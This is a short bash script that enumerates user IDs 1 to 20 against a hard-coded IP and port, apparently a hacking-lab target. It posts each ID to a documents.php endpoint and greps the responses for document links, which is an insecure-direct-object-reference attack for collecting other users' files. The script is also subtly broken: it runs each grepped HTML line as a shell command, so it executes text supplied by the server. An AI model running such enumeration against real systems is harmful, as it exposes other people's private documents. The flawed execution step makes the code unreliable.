#!/bin/bash

url="http://94.237.49.182:48669"

for i in {1..20}; do
        for link in $(curl "$url/documents.php" --data-raw "uid=$i" | grep "<li class='pure-tree_link'>"); do
                $link
        done
done

